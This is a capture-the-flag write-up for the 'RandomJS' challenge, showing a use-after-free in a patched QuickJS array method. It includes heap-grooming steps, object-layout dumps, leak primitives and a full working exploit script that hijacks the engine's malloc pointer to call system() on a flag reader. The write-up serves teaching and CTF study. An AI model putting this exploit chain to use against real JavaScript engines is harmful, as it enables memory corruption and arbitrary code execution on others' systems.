---
title: "RandomJS"
date: 2025-09-09
event: ASIS Quals 2025
points: 334
difficulty: hard
tags: ["quickJS", "UAF"]
---

This past weekend, I participated in the `ASIS CTF` and focused on the `RandomJS` challenge, managing to solve it just before the event ended. In this writeup, I’ll not only walk through my solution but also share some insights into the internals of quickJS, which I hadn’t explored much before. Let’s skip the ranting and dive right in!

## Challenge Patch:

Start by reviewing the patch file provided with the challenge. Most of the changes are unrelated, as they aim to prevent unintended solutions like directly reading the flag or executing the `readflag` binary.

The core of the patch introduces a function that selects and returns a `random element` from an `array`:

```patch
+static JSValue js_array_randompick(JSContext *ctx, JSValueConst this_val,
+                           int argc, JSValueConst *argv)
+{
+    JSValue obj, ret;
+    int64_t len, idx;
+    JSValue *arrp;
+    uint32_t count;
+
+    obj = JS_ToObject(ctx, this_val);
+    if (js_get_length64(ctx, &len, obj))
+        goto exception;
+
+    idx = rand() % len;
+
+    if (js_get_fast_array(ctx, obj, &arrp, &count) && idx < count) ret = (JSValue) arrp[idx];
+    else {
+        int present = JS_TryGetPropertyInt64(ctx, obj, idx, &ret);
+        if (present < 0)
+            goto exception;
+        if (!present)
+            ret = JS_UNDEFINED;
+    }
+    JS_FreeValue(ctx, obj);
+    return ret;
+ exception:
+    JS_FreeValue(ctx, obj);
+    return JS_EXCEPTION;
+}
```

## Analysis:

Let’s compare this to the standard way of accessing an array element by index in `quickjs.c`:

```c
static JSValue js_array_at(JSContext *ctx, JSValueConst this_val,
                           int argc, JSValueConst *argv)
{
    JSValue obj, ret;
    int64_t len, idx;
    JSValue *arrp;
    uint32_t count;

    obj = JS_ToObject(ctx, this_val);
    if (js_get_length64(ctx, &len, obj))
        goto exception;

    if (JS_ToInt64Sat(ctx, &idx, argv[0]))
        goto exception;

    if (idx < 0)
        idx = len + idx;
    if (idx < 0 || idx >= len) {
        ret = JS_UNDEFINED;
    } else if (js_get_fast_array(ctx, obj, &arrp, &count) && idx < count) {
        ret = JS_DupValue(ctx, arrp[idx]);
    } else {
        int present = JS_TryGetPropertyInt64(ctx, obj, idx, &ret);
        if (present < 0)
            goto exception;
        if (!present)
            ret = JS_UNDEFINED;
    }
    JS_FreeValue(ctx, obj);
    return ret;
 exception:
    JS_FreeValue(ctx, obj);
    return JS_EXCEPTION;
}
```

The only real distinction between these two functions is that one `duplicates` the value before returning it, while the other does not.

> But does this actually make a difference?

Absolutely! The `JS_DupValue` function increases the reference count of the object, which signals to the engine that the object is still in use and should not be freed.

```c
static inline JSValue JS_DupValue(JSContext *ctx, JSValueConst v)
{
    if (JS_VALUE_HAS_REF_COUNT(v)) {
        JSRefCountHeader *p = (JSRefCountHeader *)JS_VALUE_GET_PTR(v);
        p->ref_count++;
    }
    return (JSValue)v;
}
```
If we can get the reference count to zero, the engine might free the object even though we still have a reference to it, essentially creating a `dangling pointer`.

## quickJS Internals:

The `JS_FreeValue` function doesn’t immediately `free` the value; it simply decrements the reference count and only `frees` the object when the count reaches zero (meaning nothing else is using it).

```c
static inline void JS_FreeValue(JSContext *ctx, JSValue v)
{
    if (JS_VALUE_HAS_REF_COUNT(v)) {
        JSRefCountHeader *p = (JSRefCountHeader *)JS_VALUE_GET_PTR(v);
        if (--p->ref_count <= 0) {
            __JS_FreeValue(ctx, v);
        }
    }
}
```

> **Triggering the bug** : When you call `randompick`(), it returns an array element without incrementing its reference count. If you don’t use the return value, `JS_FreeValue` is called, potentially freeing the object while you still have access to it.

Every Object in quickJS allocates an object of size 0x50. This is useful because we will somehow have to get an overlapping chunk between an object and a `backing store` of some `arraybuffer`. This way, we can completely control the object and its pointers.

```txt
type = struct JSObject {
/* 0x0000      |  0x0018 */    union {
/*                0x0018 */        JSGCObjectHeader header;
/*                0x0008 */        struct {
/* 0x0000      |  0x0004 */            int __gc_ref_count;
/* 0x0004      |  0x0001 */            uint8_t __gc_mark;
/* 0x0005: 0x0 |  0x0001 */            uint8_t extensible : 1;
/* 0x0005: 0x1 |  0x0001 */            uint8_t free_mark : 1;
/* 0x0005: 0x2 |  0x0001 */            uint8_t is_exotic : 1;
/* 0x0005: 0x3 |  0x0001 */            uint8_t fast_array : 1;
/* 0x0005: 0x4 |  0x0001 */            uint8_t is_constructor : 1;
/* 0x0005: 0x5 |  0x0001 */            uint8_t is_uncatchable_error : 1;
/* 0x0005: 0x6 |  0x0001 */            uint8_t tmp_mark : 1;
/* 0x0005: 0x7 |  0x0001 */            uint8_t is_HTMLDDA : 1;
/* 0x0006      |  0x0002 */            uint16_t class_id;

                                       /* total size (bytes):    8 */
                                   };

                                   /* total size (bytes):   24 */
                               };
/* 0x0018      |  0x0004 */    uint32_t weakref_count;
/* XXX  4-byte hole      */
/* 0x0020      |  0x0008 */    JSShape *shape;
/* 0x0028      |  0x0008 */    JSProperty *prop;
/* 0x0030      |  0x0018 */    union {
/*                0x0008 */        void *opaque;
/*                0x0008 */        struct JSBoundFunction *bound_function;
/*                0x0008 */        struct JSCFunctionDataRecord *c_function_data_record;
/*                0x0008 */        struct JSForInIterator *for_in_iterator;
/*                0x0008 */        struct JSArrayBuffer *array_buffer;
/*                0x0008 */        struct JSTypedArray *typed_array;
/*                0x0008 */        struct JSMapState *map_state;
/*                0x0008 */        struct JSMapIteratorData *map_iterator_data;
/*                0x0008 */        struct JSArrayIteratorData *array_iterator_data;
/*                0x0008 */        struct JSRegExpStringIteratorData *regexp_string_iterator_data;
/*                0x0008 */        struct JSGeneratorData *generator_data;
/*                0x0008 */        struct JSProxyData *proxy_data;
/*                0x0008 */        struct JSPromiseData *promise_data;
/*                0x0008 */        struct JSPromiseFunctionData *promise_function_data;
/*                0x0008 */        struct JSAsyncFunctionState *async_function_data;
/*                0x0008 */        struct JSAsyncFromSyncIteratorData *async_from_sync_iterator_data;
/*                0x0008 */        struct JSAsyncGeneratorData *async_generator_data;
/*                0x0018 */        struct {
/* 0x0030      |  0x0008 */            struct JSFunctionBytecode *function_bytecode;
/* 0x0038      |  0x0008 */            JSVarRef **var_refs;
/* 0x0040      |  0x0008 */            JSObject *home_object;

                                       /* total size (bytes):   24 */
                                   } func;
/*                0x0018 */        struct {
/* 0x0030      |  0x0008 */            JSContext *realm;
/* 0x0038      |  0x0008 */            JSCFunctionType c_function;
/* 0x0040      |  0x0001 */            uint8_t length;
/* 0x0041      |  0x0001 */            uint8_t cproto;
/* 0x0042      |  0x0002 */            int16_t magic;
/* XXX  4-byte padding   */

                                       /* total size (bytes):   24 */
                                   } cfunc;
/*                0x0018 */        struct {
/* 0x0030      |  0x0008 */            union {
/*                0x0004 */                uint32_t size;
/*                0x0008 */                struct JSTypedArray *typed_array;

                                           /* total size (bytes):    8 */
                                       } u1;
/* 0x0038      |  0x0008 */            union {
/*                0x0008 */                JSValue *values;
/*                0x0008 */                void *ptr;
/*                0x0008 */                int8_t *int8_ptr;
/*                0x0008 */                uint8_t *uint8_ptr;
/*                0x0008 */                int16_t *int16_ptr;
/*                0x0008 */                uint16_t *uint16_ptr;
/*                0x0008 */                int32_t *int32_ptr;
/*                0x0008 */                uint32_t *uint32_ptr;
/*                0x0008 */                int64_t *int64_ptr;
/*                0x0008 */                uint64_t *uint64_ptr;
/*                0x0008 */                float *float_ptr;
/*                0x0008 */                double *double_ptr;

                                           /* total size (bytes):    8 */
                                       } u;
/* 0x0040      |  0x0004 */            uint32_t count;
/* XXX  4-byte padding   */

                                       /* total size (bytes):   24 */
                                   } array;
/*                0x0010 */        JSRegExp regexp;
/*                0x0010 */        JSValue object_data;

                                   /* total size (bytes):   24 */
                               } u;

                               /* total size (bytes):   72 */
                             }
```

Next we'll quickly look into how `JSString` object is present in the memory as it will give us an easy way to get an OOB in the heap.

```
type = struct JSString {
/* 0x0000      |  0x0004 */    JSRefCountHeader header;
/* 0x0004: 0x0 |  0x0004 */    uint32_t len : 31;
/* 0x0007: 0x7 |  0x0001 */    uint8_t is_wide_char : 1;
/* 0x0008: 0x0 |  0x0004 */    uint32_t hash : 30;
/* 0x000b: 0x6 |  0x0001 */    uint8_t atom_type : 2;
/* 0x000c      |  0x0004 */    uint32_t hash_next;
/* 0x0010      |  0x0000 */    union {
/*                0x0000 */        uint8_t str8[0];
/*                0x0000 */        uint16_t str16[0];

                                   /* total size (bytes):    0 */
                               } u;

                               /* total size (bytes):   16 */
                             }
```

As you can see, the second field in this object is the size of the string. So if we can get an `UAF` on this object, then we can get `OOB` leaks from what is after this object in the heap.

## Exploitation:

### Getting a UAF:

In order to get the `UAF`, lets abuse the `randompick` in the following way.

```js
let dummy = new ArrayBuffer(0x48);
let str = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ";
let uaf = [str];

uaf.randompick();
uaf.randompick();
uaf.randompick();
uaf.randompick();

uaf[0] = dummy;
uaf.randompick();
uaf.randompick();
uaf.randompick();   

let dummy2 = new ArrayBuffer(0x500);
let overlap1 = new Uint32Array(16);
```

`overlap1` will have its `backing_store` (data) pointing to the `str` object. How? Let us go step by step. (Just keep in mind that after all those `randompick` calls, the object will be freed in memory.)

A rough estimate of what goes under the hood in the tcache bins.

```text
Freeing `str`:
tcache bin 0x50: [str object]
Freeing `dummy`:
tcache bin 0x50: [dummy_data], [dummy_object], [str object]
Allocating `dummy2`:
tcache bin 0x50: [dummy_object], [str object]
overlap1 -> object memory = dummy_object
overlap1's data = str object [16 * 4] (or even [18 * 4] should work as it allocates a size of 0x50.)
```

### Getting Leaks:
With this `UAF` just change the size of the string and make a function to read characters at different offsets.

```js
overlap1[0] = 20; //ref count, Set it high so it does not get freed and get us into trouble
overlap1[1] = 0x41414141; // String length
overlap1[2] = 0x497f93b1; // Metadata

// Function to get the leaks:
const read_offset_dword = (offset) => {
    let res = 0;
    for (let i = 3; i >= 0; i--) {
        res = (res << 8) | str.charCodeAt(offset + i);
    }
    return res;
};
``` 
With this, you can get any of the `heap` pointers that are after the string object. If you find a `libc` pointer as well, grab it and save time, but unfortunately we did not find any `libc` leak after the object.

### Getting Libc Leak:

We can get a `UAF` similarly on the object of `Uint32Array` then all we have to do is change the pointer to its data to somewhere in the heap which will have a libc leak.

```js
// UAF on rem
let rem = new Uint32Array(0x140);

uaf = [rem];

uaf.randompick();
uaf.randompick();
uaf.randompick();

let overlap = new Uint32Array(18);
overlap[0] = 69; //ref count
overlap[1] = 0x001b0d00; // class_id/flags
overlap[0x10] = 0x41414141; // length

heap_addr = heap + 0x1d4b0;
overlap[8] = heap_addr % 0x100000000;
overlap[9] = heap_addr / 0x100000000;
overlap[0xe] = (heap + 0x2f90) % 0x100000000;
overlap[0xf] = (heap + 0x2f90) / 0x100000000;
```

### Getting RCE:

There are many ways to get an RCE from this point but the easiest way I found reading [this](https://maplebacon.org/2024/05/sdctf-slowjspp/) blogpost was overwriting the `ctx->rt->mf->js_malloc` to `system` then overwriting the `ctx->rt->malloc_state` with `readflag`. 

```c
void *js_malloc_rt(JSRuntime *rt, size_t size)
{
    return rt->mf.js_malloc(&rt->malloc_state, size);
}
``` 

## Full Exploit:

```js
function d2u(v) {
    f64[0] = v;
    return u32;
}
function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}
function hex(val) {
    return '0x' + val.toString(16);
}
function leak(obj){
    return console.log(leakAddress(obj));
}

const read_dword = (offset) => {
    let result = 0;
    for (let i = 3; i >= 0; i--) {
        result = (result << 8) | str.charCodeAt(offset + i);
    }
    return result;
};

// ACTUAL EXPLOIT CODE

// Creating a few filler objects for other misc allocations
let a = 1;
let dummy = new ArrayBuffer(0x48);

// Getting Leaks to leverage the UAF
let str = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ";
let uaf = [str];

uaf.randompick();
uaf.randompick();
uaf.randompick();
uaf.randompick();

uaf[0] = dummy;
uaf.randompick();
uaf.randompick();
uaf.randompick();   

let dummy2 = new ArrayBuffer(0x500);
let overlap1 = new Uint32Array(16);
Math.min(overlap1);

overlap1[0] = 20; //ref count
overlap1[1] = 0x41414141; // String length
overlap1[2] = 0x497f93b1; // Metadata

uaf[0] = dummy2;
uaf.randompick();   
uaf.randompick();
uaf.randompick();

let ind = 0;1
for (let i = 0; i < 0x500; i++) {
    let val = read_dword(0x2700 + i*4);
    let val2 = read_dword(0x2700 + i*4 + 4);
    if(val%0x1000 == 0xb20 && val2>>(44) == 0x7){
        console.log("[+] Found!! "+hex(i*4));
        ind = i*4;
        break;
    }
}

up = read_dword(0x1b24);
low = read_dword(0x1b20);

heap_up = read_dword(0x314); 
heap_low = read_dword(0x310);
heap = (((heap_up * 0x100000000) + heap_low) * 0x1000) - 0x18000; 

let dummy4 = new ArrayBuffer(0x48);

// UAF on rem
let rem = new Uint32Array(0x140);

uaf = [rem];

uaf.randompick();
uaf.randompick();
uaf.randompick();

let overlap = new Uint32Array(18);
overlap[0] = 69; //ref count
overlap[1] = 0x001b0d00; // class_id/flags
overlap[0x10] = 0x41414141; // length

heap_addr = heap + 0x1d4b0;
overlap[8] = heap_addr % 0x100000000;
overlap[9] = heap_addr / 0x100000000;
overlap[0xe] = (heap + 0x2f90) % 0x100000000;
overlap[0xf] = (heap + 0x2f90) / 0x100000000;

libc_leak = (rem[1]*0x100000000 + rem[0]) - 0x210b20

console.log("heap: " + hex(heap));
console.log("libc: " + hex(libc_leak));
free_hook = heap + 0x2a8 - 8;

overlap[0xe] = (free_hook) % 0x100000000;
overlap[0xf] = (free_hook) / 0x100000000;

rem[0] = (libc_leak + 0x5c110)%0x100000000;
rem[1] = (libc_leak + 0x5c110)/0x100000000;

rem[8] = 0x6165722f;
rem[9] = 0x616c6664;
rem[10] = 0x00000067;

Math.min(rem);
```

This post may not cover every detail, but I hope it encourages readers to dig deeper into the internals. Until next time!


## References:
- https://maplebacon.org/2024/05/sdctf-slowjspp/
- https://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html